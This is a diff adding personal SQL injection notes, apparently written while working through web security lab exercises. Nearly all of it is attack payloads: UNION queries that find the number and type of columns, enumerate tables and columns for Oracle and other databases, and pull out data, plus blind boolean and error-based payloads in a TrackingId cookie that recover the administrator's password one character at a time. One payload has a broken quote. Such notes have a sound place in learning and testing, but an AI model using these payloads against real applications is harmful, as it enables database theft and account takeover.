@@ -1,0 +1,38 @@
+SQL injection notes:
+
+************ General notes about different databases ************
+    Oracle:
+        Requieres from statement in query -> general table is dual
+
+************ Union attack ************
+    Check if for number of columns of the table:
+            - ' Union Select Null --
+            - ' Union Select Null,Null --
+            - ' Union Select Null,Null,Null,... --
+        verify what is the type of the columns:
+            - ' Union Select 'test',1,Null,... --
+
+    find table names: (replace table_schema with null to fill columns)
+            - (non_Oracle) ' UNION+select+table_schema,table_name+FROM+information_Schema.tables
+            - (Oracle) ' UNION+select+table_schema,table_name+FROM+all_tables    
+
+    find column names of a specific table:
+            - (non_Oracle) '+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
+            - (Oracle) '+UNION+SELECT+column_name,+NULL+FROM+all_tab_columns+WHERE+table_name='users_abcdef'--
+   
+    find data of columns:
+            - (non_Oracle) '+UNION+SELECT+column1,+column2+FROM+table_x+--
+            - (Oracle) '+UNION+SELECT+column1,+column2+FROM+table_x+--
+    
+
+************ Blind SQL injection ************
+
+    Modifying TrackingId cookies:
+            - (Boolean server response) ' AND (SELECT SUBSTRING(password,1,1) From users WHERE USERNAME='administrator='c'
+            - (Boolean error response ORACLE) 'AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'A' END FROM dual) = 'A'--
+                replace (1=2) by desired query and dual to desired table
+              Sample commands:
+                'AND (SELECT CASE WHEN LENGTH(password) >20 THEN TO_CHAR(1/0) ELSE 'A' END FROM users WHERE username='administrator') = 'A'--
+                'AND (SELECT CASE WHEN SUBSTR(password,§1§,1)='§a§' THEN TO_CHAR(1/0) ELSE 'A' END FROM users WHERE username='administrator') = 'A'--
+
+   
